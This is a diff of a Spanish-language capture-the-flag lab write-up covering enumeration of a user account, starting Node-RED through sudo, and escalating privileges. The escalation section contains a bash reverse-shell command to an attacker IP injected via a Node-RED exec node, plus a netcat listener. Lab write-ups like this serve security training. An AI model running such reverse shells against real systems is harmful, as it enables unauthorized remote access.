@@ -86,7 +86,7 @@ dfinkelstein:x:1002:1002:,,,:/home/dfinkelstein:/bin/bash
 
 ```
 
-### Verificamos que permisos puede ejecutar el usuario como root
+Verificamos que permisos puede ejecutar el usuario como root
 ```bash
 dfinkelstein@tnightmarebc:~$ sudo -l
 Matching Defaults entries for dfinkelstein on tnightmarebc:
@@ -97,7 +97,7 @@ User dfinkelstein may run the following commands on tnightmarebc:
 dfinkelstein@tnightmarebc:~$ 
 ```
 
-###  Verificamos que hay disponible dentro del usuario, incluidos los archivos ocultos
+Verificamos que hay disponible dentro del usuario, incluidos los archivos ocultos
 ```bash
 dfinkelstein@tnightmarebc:~$ ls -la
 total 20
@@ -109,7 +109,7 @@ lrwxrwxrwx 1 dfinkelstein dfinkelstein    9 oct 31  2025 .bash_history -> /dev/n
 drwxr-xr-x 3 dfinkelstein dfinkelstein 4096 oct 31  2025 .local
 ```
 
- ### Abrimos el archivo help, en donde se encuentra la información para ejecutar el servicio NODE-RED (aunque usando el paso de comprobación de permisos root, ya habiamos visto el comando ejecutable para activar NODE-RED)
+Abrimos el archivo help, en donde se encuentra la información para ejecutar el servicio NODE-RED (aunque usando el paso de comprobación de permisos root, ya habiamos visto el comando ejecutable para activar NODE-RED)
 ```bash
 dfinkelstein@tnightmarebc:~$ cat help.txt
 Contenido seguro para dfinkelstein
@@ -121,22 +121,23 @@ Si controlas Node Red controlas el mundo.
 - Parar Servicio: sudo /usr/local/bin/nodered-toggle stop
 ```
 
-### Activamos NODE-RED
+Activamos NODE-RED
 ```bash
 dfinkelstein@tnightmarebc:~$ sudo /usr/local/bin/nodered-toggle start
 ✅ Node-RED activo
 ```
 
+---
 ## Escalada de privilegios
 
 ### Inyección mediante NODE-RED
-Gracias a NODE-RED, el comando que se puede ver en la imágen, funciona cuando se inyecta el comando, porque el sistema ejecuta el input del usuario directamente en el sistema operativo mediante nodos como exec, sin una validación o sanitización adecuada, lo que permite que el string sea interpretado por Bash y se establezca la conexión inversa hacia el atacante.
+Gracias a NODE-RED, el comando que se puede ver en la imágen, funciona cuando se inyecta el comando `bash -c 'bash -i >& /dev/tcp/192.168.128.160/4444 0>&1'` porque el sistema ejecuta el input del usuario directamente en el sistema operativo mediante nodos como exec, sin una validación o sanitización adecuada, lo que permite que el string sea interpretado por Bash y se establezca la conexión inversa hacia el atacante.
 Permitiendo ingresar al usuario dev, del cual no se posee la contraseña.
 
 ![](Evidencias_Visuales/inyección_NODE-RED)
 
-bash -c 'bash -i >& /dev/tcp/192.168.128.160/4444 0>&1'
 
+### Inyección mediante NODE-RED
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ nc -lvnp 4444
